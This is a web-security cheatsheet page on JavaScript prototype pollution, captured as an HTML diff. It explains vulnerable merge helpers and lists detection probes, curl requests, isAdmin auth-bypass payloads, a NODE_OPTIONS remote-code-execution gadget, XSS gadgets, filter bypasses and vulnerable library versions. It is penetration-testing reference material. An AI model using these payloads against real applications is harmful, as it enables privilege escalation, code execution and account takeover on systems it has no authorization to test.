Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-mobile-sections-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-mobile-sections-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-mobile-sections-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class="cheatsheet-mobile-sections-link is-current">WEB15 Prototype Pollution</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>JavaScript-specific. Setting <code>__proto__</code> or <code>constructor.prototype</code> properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>T</span><span class=o>=</span>https://target.com
+</span></span></code></pre></div><h2 id=i-where-it-lives data-heading-permalink=true><span class=heading-content>i. Where it lives</span>
+<a class=heading-permalink href=#i-where-it-lives aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Prototype pollution requires a code pattern like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>merge</span><span class=p>(</span><span class=nx>target</span><span class=p>,</span> <span class=nx>source</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>key</span> <span class=k>in</span> <span class=nx>source</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>source</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>merge</span><span class=p>(</span><span class=nx>target</span><span class=p>[</span><span class=nx>key</span><span class=p>],</span> <span class=nx>source</span><span class=p>[</span><span class=nx>key</span><span class=p>]);</span>   <span class=c1>// recursive - pollutes if source has __proto__
+</span></span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>target</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=o>=</span> <span class=nx>source</span><span class=p>[</span><span class=nx>key</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Common surfaces:</p><ul><li>JSON merge / extend / clone helpers (lodash <code>_.merge</code>, jQuery <code>$.extend(true, ...)</code>, deep-extend, deeply)</li><li>Object.assign-like helpers that recursively merge user input</li><li>Express middleware that merges req.body into options</li><li>Query string parsers (qs, querystring, express body parser) - controller actions that take entire object directly into merge</li><li>Configuration loaders that merge user JSON into defaults</li><li>Mongoose pre-save hooks that merge user data</li><li>React/Vue prop merging in libraries</li></ul><p>Two flavors:</p><ul><li><strong>Server-side</strong> (Node.js apps) → RCE via gadget</li><li><strong>Client-side</strong> (any JS in the browser) → XSS via gadget</li></ul><h2 id=ii-server-side-detection data-heading-permalink=true><span class=heading-content>ii. Server-side detection</span>
+<a class=heading-permalink href=#ii-server-side-detection aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When the app accepts JSON, send:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;polluted&#34;</span><span class=p>:</span> <span class=s2>&#34;yes&#34;</span><span class=p>}}</span>
+</span></span></code></pre></div><p>Or for stacked / nested attacks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;constructor&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;prototype&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;polluted&#34;</span><span class=p>:</span> <span class=s2>&#34;yes&#34;</span><span class=p>}}}</span>
+</span></span></code></pre></div><p>Then make a separate, unrelated request to ANY endpoint that returns JSON. If <code>polluted: "yes"</code> appears in an unrelated response → vuln confirmed.</p><p>Alternative test - pollute a common Node.js HTTP option:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;_method&#34;</span><span class=p>:</span> <span class=s2>&#34;PUT&#34;</span><span class=p>}}</span>
+</span></span></code></pre></div><p>Then make a subsequent request. If Express interprets the method as PUT despite POST → polluted.</p><p>Or check Node.js global flags:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;isAdmin&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>}}</span>
+</span></span></code></pre></div><p>Make a follow-up authenticated request. If isAdmin is now true → polluted.</p><h2 id=iii-server-side-detection-one-liner data-heading-permalink=true><span class=heading-content>iii. Server-side detection one-liner</span>
+<a class=heading-permalink href=#iii-server-side-detection-one-liner aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Single curl probe + read of any reflected response. Both <code>__proto__</code> and <code>constructor.prototype</code> need testing:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Pollute:</span>
+</span></span><span class=line><span class=cl>curl -X POST <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/users&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -d <span class=s1>&#39;{&#34;__proto__&#34;: {&#34;isAdmin&#34;: true}}&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Read back from any endpoint:</span>
+</span></span><span class=line><span class=cl>curl -s <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/me&#34;</span> <span class=p>|</span> jq
+</span></span><span class=line><span class=cl><span class=c1>## isAdmin shows up where it shouldn&#39;t</span>
+</span></span></code></pre></div><p>Some apps need a server restart for the pollution to clear - note this when reporting (persistence model).</p><h2 id=iv-tools data-heading-permalink=true><span class=heading-content>iv. Tools</span>
+<a class=heading-permalink href=#iv-tools aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=ppmap--ppmap data-heading-permalink=true><span class=heading-content>PPMap / ppmap</span>
+<a class=heading-permalink href=#ppmap--ppmap aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Detects pollutions on Express-style apps:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/y0giii/Server-Side-Prototype-Pollution-Gadgets
+</span></span><span class=line><span class=cl><span class=c1>## Various tools in there for testing common gadgets</span>
+</span></span></code></pre></div><p>The tooling space for server-side PP is still maturing - manual is more reliable than automated tools for now.</p><h3 id=dom-invader-burp-pro data-heading-permalink=true><span class=heading-content>DOM Invader (Burp Pro)</span>
+<a class=heading-permalink href=#dom-invader-burp-pro aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Best client-side PP detection. Enable in Burp&rsquo;s Chromium → Settings → DOM Invader → Enable Prototype Pollution. Browse the target. DOM Invader reports every controllable source-to-pollution-sink path it sees.</p><h3 id=nuclei--custom-templates data-heading-permalink=true><span class=heading-content>nuclei + custom templates</span>
+<a class=heading-permalink href=#nuclei--custom-templates aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nuclei -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>&#34;</span> -tags pp,prototype
+</span></span></code></pre></div><p>Catches common patterns like the Express body parser merge bugs.</p><h3 id=portswiggers-pp-scanner-burp-pro data-heading-permalink=true><span class=heading-content>PortSwigger&rsquo;s PP scanner (Burp Pro)</span>
+<a class=heading-permalink href=#portswiggers-pp-scanner-burp-pro aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Active scanner audit phase covers server-side PP.</p><h2 id=v-client-side-prototype-pollution data-heading-permalink=true><span class=heading-content>v. Client-side prototype pollution</span>
+<a class=heading-permalink href=#v-client-side-prototype-pollution aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>DOM PP happens when client JS does merges with <code>location.hash</code>, <code>location.search</code>, <code>window.name</code>, postMessage data, or any other client-controllable input.</p><p>Probe via URL:</p><pre tabindex=0><code>https://target.com/#__proto__[polluted]=yes
 https://target.com/?__proto__[polluted]=yes
 https://target.com/#?__proto__.polluted=yes
-</code></pre><p>In browser console after visit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">polluted</span><span class="p">)</span>   <span class="c1">// &#34;yes&#34; → vuln
-</span></span></span></code></pre></div><p>DOM Invader handles this automatically - paste the target URL, watch for findings.</p>
-<h2 id="vi-from-pollution-to-impact" data-heading-permalink="true"><span class="heading-content">vi. From pollution to impact</span>
-    <a class="heading-permalink" href="#vi-from-pollution-to-impact" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Pollution alone is harmless. You need a &ldquo;gadget&rdquo; - application code that later reads a property and assumes it doesn&rsquo;t exist.</p>
-<h3 id="server-side-rce-gadgets" data-heading-permalink="true"><span class="heading-content">Server-side RCE gadgets</span>
-    <a class="heading-permalink" href="#server-side-rce-gadgets" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>The classic Node.js RCE gadget involves polluting properties that get used in <code>child_process.spawn()</code> / <code>child_process.exec()</code> calls with the <code>options</code> parameter:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&#34;shell&#34;</span><span class="p">:</span> <span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&#34;argv0&#34;</span><span class="p">:</span> <span class="s2">&#34;node&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nt">&#34;env&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;NODE_OPTIONS&#34;</span><span class="p">:</span> <span class="s2">&#34;--require /tmp/payload.js&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>When the app later calls <code>child_process.exec('ls')</code> with no options, the polluted prototype provides <code>shell</code>, <code>argv0</code>, and <code>env</code>, leading to code execution via NODE_OPTIONS injection.</p>
-<p>The full chain depends on libraries loaded. Look at:</p>
-<ul>
-<li><a href="https://github.com/y0giii/Server-Side-Prototype-Pollution-Gadgets" target="_blank" rel="noopener noreferrer">Server-Side Prototype Pollution Gadgets</a>
-</li>
-<li><a href="https://portswigger.net/web-security/prototype-pollution/server-side" target="_blank" rel="noopener noreferrer">PortSwigger - Server-side prototype pollution</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution" target="_blank" rel="noopener noreferrer">HackTricks - Server-side PP</a>
-</li>
-</ul>
-<p>Common library-specific gadgets:</p>
-<ul>
-<li><code>lodash.template</code> - polluted options enable code execution</li>
-<li><code>ejs.render</code> - polluted options inject code</li>
-<li><code>handlebars</code> - polluted helpers</li>
-<li><code>mongoose</code> queries - pollution affects model behavior</li>
-<li><code>express-validator</code> config</li>
-</ul>
-<h3 id="client-side-xss-gadgets" data-heading-permalink="true"><span class="heading-content">Client-side XSS gadgets</span>
-    <a class="heading-permalink" href="#client-side-xss-gadgets" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Pollute properties that later end up in <code>innerHTML</code>, <code>eval()</code>, <code>document.write()</code>, or as a <code>src</code> attribute:</p>
-<table>
-  <thead>
-      <tr>
-          <th>Gadget</th>
-          <th>Pollution that triggers XSS</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>jQuery 3.0-3.4.0 <code>$()</code></td>
-          <td><code>__proto__[context]</code></td>
-      </tr>
-      <tr>
-          <td>Embed.ly</td>
-          <td><code>__proto__[allowedMediaTypes]</code></td>
-      </tr>
-      <tr>
-          <td>Google Analytics</td>
-          <td>varies by gadget</td>
-      </tr>
-      <tr>
-          <td>Various Vue / Angular configs</td>
-          <td>per-version</td>
-      </tr>
-  </tbody>
-</table>
-<p>Check <a href="https://github.com/BlackFan/client-side-prototype-pollution" target="_blank" rel="noopener noreferrer">client-side-prototype-pollution</a>
- for an enumerated list. The site gives you &ldquo;if this library is loaded, here&rsquo;s the pollution that triggers XSS.&rdquo;</p>
-<h3 id="auth-bypass-gadgets" data-heading-permalink="true"><span class="heading-content">Auth bypass gadgets</span>
-    <a class="heading-permalink" href="#auth-bypass-gadgets" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Property checks like <code>if (!user.isAdmin)</code> become permissive when prototype pollution sets <code>isAdmin: true</code> globally. Test by polluting then accessing privileged endpoints.</p>
-<h2 id="vii-detection-probes-table" data-heading-permalink="true"><span class="heading-content">vii. Detection probes table</span>
-    <a class="heading-permalink" href="#vii-detection-probes-table" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Test all of these (different parsers handle each differently):</p>
-<pre tabindex="0"><code>?__proto__[polluted]=yes
+</code></pre><p>In browser console after visit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>Object</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>polluted</span><span class=p>)</span>   <span class=c1>// &#34;yes&#34; → vuln
+</span></span></span></code></pre></div><p>DOM Invader handles this automatically - paste the target URL, watch for findings.</p><h2 id=vi-from-pollution-to-impact data-heading-permalink=true><span class=heading-content>vi. From pollution to impact</span>
+<a class=heading-permalink href=#vi-from-pollution-to-impact aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Pollution alone is harmless. You need a &ldquo;gadget&rdquo; - application code that later reads a property and assumes it doesn&rsquo;t exist.</p><h3 id=server-side-rce-gadgets data-heading-permalink=true><span class=heading-content>Server-side RCE gadgets</span>
+<a class=heading-permalink href=#server-side-rce-gadgets aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>The classic Node.js RCE gadget involves polluting properties that get used in <code>child_process.spawn()</code> / <code>child_process.exec()</code> calls with the <code>options</code> parameter:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;__proto__&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;shell&#34;</span><span class=p>:</span> <span class=s2>&#34;/bin/sh&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;argv0&#34;</span><span class=p>:</span> <span class=s2>&#34;node&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;env&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;NODE_OPTIONS&#34;</span><span class=p>:</span> <span class=s2>&#34;--require /tmp/payload.js&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>When the app later calls <code>child_process.exec('ls')</code> with no options, the polluted prototype provides <code>shell</code>, <code>argv0</code>, and <code>env</code>, leading to code execution via NODE_OPTIONS injection.</p><p>The full chain depends on libraries loaded. Look at:</p><ul><li><a href=https://github.com/y0giii/Server-Side-Prototype-Pollution-Gadgets target=_blank rel="noopener noreferrer">Server-Side Prototype Pollution Gadgets</a></li><li><a href=https://portswigger.net/web-security/prototype-pollution/server-side target=_blank rel="noopener noreferrer">PortSwigger - Server-side prototype pollution</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution target=_blank rel="noopener noreferrer">HackTricks - Server-side PP</a></li></ul><p>Common library-specific gadgets:</p><ul><li><code>lodash.template</code> - polluted options enable code execution</li><li><code>ejs.render</code> - polluted options inject code</li><li><code>handlebars</code> - polluted helpers</li><li><code>mongoose</code> queries - pollution affects model behavior</li><li><code>express-validator</code> config</li></ul><h3 id=client-side-xss-gadgets data-heading-permalink=true><span class=heading-content>Client-side XSS gadgets</span>
+<a class=heading-permalink href=#client-side-xss-gadgets aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Pollute properties that later end up in <code>innerHTML</code>, <code>eval()</code>, <code>document.write()</code>, or as a <code>src</code> attribute:</p><table><thead><tr><th>Gadget</th><th>Pollution that triggers XSS</th></tr></thead><tbody><tr><td>jQuery 3.0-3.4.0 <code>$()</code></td><td><code>__proto__[context]</code></td></tr><tr><td>Embed.ly</td><td><code>__proto__[allowedMediaTypes]</code></td></tr><tr><td>Google Analytics</td><td>varies by gadget</td></tr><tr><td>Various Vue / Angular configs</td><td>per-version</td></tr></tbody></table><p>Check <a href=https://github.com/BlackFan/client-side-prototype-pollution target=_blank rel="noopener noreferrer">client-side-prototype-pollution</a>
+for an enumerated list. The site gives you &ldquo;if this library is loaded, here&rsquo;s the pollution that triggers XSS.&rdquo;</p><h3 id=auth-bypass-gadgets data-heading-permalink=true><span class=heading-content>Auth bypass gadgets</span>
+<a class=heading-permalink href=#auth-bypass-gadgets aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Property checks like <code>if (!user.isAdmin)</code> become permissive when prototype pollution sets <code>isAdmin: true</code> globally. Test by polluting then accessing privileged endpoints.</p><h2 id=vii-detection-probes-table data-heading-permalink=true><span class=heading-content>vii. Detection probes table</span>
+<a class=heading-permalink href=#vii-detection-probes-table aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Test all of these (different parsers handle each differently):</p><pre tabindex=0><code>?__proto__[polluted]=yes
 ?__proto__.polluted=yes
 ?constructor[prototype][polluted]=yes
 ?constructor.prototype.polluted=yes
@@ -494,167 +78,21 @@ https://target.com/#?__proto__.polluted=yes
 
 # Nested:
 {&#34;a&#34;:{&#34;b&#34;:{&#34;__proto__&#34;:{&#34;polluted&#34;:&#34;yes&#34;}}}}
-</code></pre><p>Different middleware exposes different ones. Trying all four common formats covers most cases.</p>
-<h2 id="viii-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">viii. Tricks worth knowing</span>
-    <a class="heading-permalink" href="#viii-tricks-worth-knowing" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="persistence-and-propagation" data-heading-permalink="true"><span class="heading-content">Persistence and propagation</span>
-    <a class="heading-permalink" href="#persistence-and-propagation" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Once polluted, the prototype stays polluted for the lifetime of that Node.js process. The next 1000 requests inherit your pollution. This is also its detection mechanism - pollute first, observe later.</p>
-<h3 id="after-effect-testing" data-heading-permalink="true"><span class="heading-content">After-effect testing</span>
-    <a class="heading-permalink" href="#after-effect-testing" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Don&rsquo;t just check the response to the polluting request. The pollution effect is on SUBSEQUENT requests. Send the pollution request, then 5-10 follow-up requests to various endpoints. Watch for unusual responses where expected fields appear with your polluted values.</p>
-<h3 id="type-coercion-abuse" data-heading-permalink="true"><span class="heading-content">Type coercion abuse</span>
-    <a class="heading-permalink" href="#type-coercion-abuse" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Pollute boolean / numeric checks:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;length&#34;</span><span class="p">:</span> <span class="mi">-1</span><span class="p">}}</span>
-</span></span></code></pre></div><p>Loops with <code>for (let i = 0; i &lt; arr.length; i++)</code> may misbehave. Useful for race conditions and bypassing length-based checks.</p>
-<h3 id="multiple-stage-chains" data-heading-permalink="true"><span class="heading-content">Multiple-stage chains</span>
-    <a class="heading-permalink" href="#multiple-stage-chains" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>First pollute prototype, then exploit a separate input that becomes RCE because the polluted defaults activate. Two-step attacks are harder to detect but common in real apps.</p>
-<h3 id="objectcreatenull-is-safe" data-heading-permalink="true"><span class="heading-content">Object.create(null) is safe</span>
-    <a class="heading-permalink" href="#objectcreatenull-is-safe" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Objects created with <code>Object.create(null)</code> have no prototype chain. Code using these isn&rsquo;t vulnerable. Frameworks shifting to this pattern post-2020 are partly closing the bug class.</p>
-<h3 id="combine-with-json-deserialization" data-heading-permalink="true"><span class="heading-content">Combine with JSON deserialization</span>
-    <a class="heading-permalink" href="#combine-with-json-deserialization" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>JSON.parse doesn&rsquo;t pollute. But once parsed, recursive helpers (merge/extend/clone) DO. Look for code that JSON.parses input then merges into config - the merge is where pollution lands.</p>
-<h3 id="use-jsfuck-like-obfuscation-for-filter-bypass" data-heading-permalink="true"><span class="heading-content">Use jsfuck-like obfuscation for filter bypass</span>
-    <a class="heading-permalink" href="#use-jsfuck-like-obfuscation-for-filter-bypass" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Some apps filter <code>__proto__</code> or <code>constructor</code> literals. Bypass:</p>
-<pre tabindex="0"><code>\u005f\u005fproto\u005f\u005f
+</code></pre><p>Different middleware exposes different ones. Trying all four common formats covers most cases.</p><h2 id=viii-tricks-worth-knowing data-heading-permalink=true><span class=heading-content>viii. Tricks worth knowing</span>
+<a class=heading-permalink href=#viii-tricks-worth-knowing aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=persistence-and-propagation data-heading-permalink=true><span class=heading-content>Persistence and propagation</span>
+<a class=heading-permalink href=#persistence-and-propagation aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Once polluted, the prototype stays polluted for the lifetime of that Node.js process. The next 1000 requests inherit your pollution. This is also its detection mechanism - pollute first, observe later.</p><h3 id=after-effect-testing data-heading-permalink=true><span class=heading-content>After-effect testing</span>
+<a class=heading-permalink href=#after-effect-testing aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Don&rsquo;t just check the response to the polluting request. The pollution effect is on SUBSEQUENT requests. Send the pollution request, then 5-10 follow-up requests to various endpoints. Watch for unusual responses where expected fields appear with your polluted values.</p><h3 id=type-coercion-abuse data-heading-permalink=true><span class=heading-content>Type coercion abuse</span>
+<a class=heading-permalink href=#type-coercion-abuse aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Pollute boolean / numeric checks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;__proto__&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;length&#34;</span><span class=p>:</span> <span class=mi>-1</span><span class=p>}}</span>
+</span></span></code></pre></div><p>Loops with <code>for (let i = 0; i &lt; arr.length; i++)</code> may misbehave. Useful for race conditions and bypassing length-based checks.</p><h3 id=multiple-stage-chains data-heading-permalink=true><span class=heading-content>Multiple-stage chains</span>
+<a class=heading-permalink href=#multiple-stage-chains aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>First pollute prototype, then exploit a separate input that becomes RCE because the polluted defaults activate. Two-step attacks are harder to detect but common in real apps.</p><h3 id=objectcreatenull-is-safe data-heading-permalink=true><span class=heading-content>Object.create(null) is safe</span>
+<a class=heading-permalink href=#objectcreatenull-is-safe aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Objects created with <code>Object.create(null)</code> have no prototype chain. Code using these isn&rsquo;t vulnerable. Frameworks shifting to this pattern post-2020 are partly closing the bug class.</p><h3 id=combine-with-json-deserialization data-heading-permalink=true><span class=heading-content>Combine with JSON deserialization</span>
+<a class=heading-permalink href=#combine-with-json-deserialization aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>JSON.parse doesn&rsquo;t pollute. But once parsed, recursive helpers (merge/extend/clone) DO. Look for code that JSON.parses input then merges into config - the merge is where pollution lands.</p><h3 id=use-jsfuck-like-obfuscation-for-filter-bypass data-heading-permalink=true><span class=heading-content>Use jsfuck-like obfuscation for filter bypass</span>
+<a class=heading-permalink href=#use-jsfuck-like-obfuscation-for-filter-bypass aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Some apps filter <code>__proto__</code> or <code>constructor</code> literals. Bypass:</p><pre tabindex=0><code>\u005f\u005fproto\u005f\u005f
 constructor.constructor
-</code></pre><p>JSON parsers accept Unicode escapes that don&rsquo;t appear as <code>__proto__</code> in string scanning.</p>
-<h2 id="ix-library-specific-notes" data-heading-permalink="true"><span class="heading-content">ix. Library-specific notes</span>
-    <a class="heading-permalink" href="#ix-library-specific-notes" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<table>
-  <thead>
-      <tr>
-          <th>Library</th>
-          <th>Note</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>lodash &lt; 4.17.5</td>
-          <td><code>_.merge</code>, <code>_.set</code>, <code>_.defaultsDeep</code> all vulnerable</td>
-      </tr>
-      <tr>
-          <td>lodash &gt;= 4.17.12</td>
-          <td><code>__proto__</code> blocked, <code>constructor.prototype</code> still works in some versions</td>
-      </tr>
-      <tr>
-          <td>jQuery &lt; 3.4.0</td>
-          <td><code>$.extend(true, ...)</code> vulnerable</td>
-      </tr>
-      <tr>
-          <td>express-validator &lt; 6.6.1</td>
-          <td>Body sanitization PP</td>
-      </tr>
-      <tr>
-          <td>qs (via Express) &lt; 6.7.3</td>
-          <td>Query parsing PP</td>
-      </tr>
-      <tr>
-          <td>mongoose &lt; 6.4.6</td>
-          <td>Document.toObject PP gadget</td>
-      </tr>
-      <tr>
-          <td>dot-prop &lt; 5.1.1</td>
-          <td>All set ops vulnerable</td>
-      </tr>
-      <tr>
-          <td>handlebars</td>
-          <td>Multiple gadgets per version</td>
-      </tr>
-      <tr>
-          <td>ejs</td>
-          <td>Polluted options → RCE</td>
-      </tr>
-  </tbody>
-</table>
-<p>Check <code>package-lock.json</code> if you have source access. The vulnerable version is often still pinned.</p>
-<h2 id="x-references" data-heading-permalink="true"><span class="heading-content">x. References</span>
-    <a class="heading-permalink" href="#x-references" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li><a href="https://portswigger.net/web-security/prototype-pollution" target="_blank" rel="noopener noreferrer">PortSwigger - Prototype pollution</a>
-</li>
-<li><a href="https://portswigger.net/web-security/prototype-pollution/server-side" target="_blank" rel="noopener noreferrer">PortSwigger - Server-side prototype pollution</a>
-</li>
-<li><a href="https://portswigger.net/web-security/prototype-pollution/client-side" target="_blank" rel="noopener noreferrer">PortSwigger - Client-side prototype pollution</a>
-</li>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - Prototype Pollution</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution" target="_blank" rel="noopener noreferrer">HackTricks - NodeJS proto/prototype pollution</a>
-</li>
-<li><a href="https://github.com/y0gii/Server-Side-Prototype-Pollution-Gadgets" target="_blank" rel="noopener noreferrer">Server-Side PP Gadgets</a>
-</li>
-<li><a href="https://github.com/BlackFan/client-side-prototype-pollution" target="_blank" rel="noopener noreferrer">Client-Side PP database</a>
-</li>
-<li><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader" target="_blank" rel="noopener noreferrer">DOM Invader docs</a>
-</li>
-</ul>
-<h2 id="xi-where-it-leads" data-heading-permalink="true"><span class="heading-content">xi. Where it leads</span>
-    <a class="heading-permalink" href="#xi-where-it-leads" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Server-side RCE via gadget → standard Node.js foothold → [[03 Shell &amp; Tooling]] / [[Reverse Shells]]</li>
-<li>Client-side XSS via gadget → session theft → see [[WEB08 XSS]]</li>
-<li>Auth bypass (isAdmin pollution) → privilege escalation in-app</li>
-<li>Data exposure (default property pollution affects queries/serialization)</li>
-</ul>
-<p>Prototype pollution sits between deserialization and XSS - JavaScript-specific, requires gadgets, but a top-tier finding when it lands because it&rsquo;s wide-ranging and often missed by AppSec scanners.</p>
-
-        </div>
-
-        
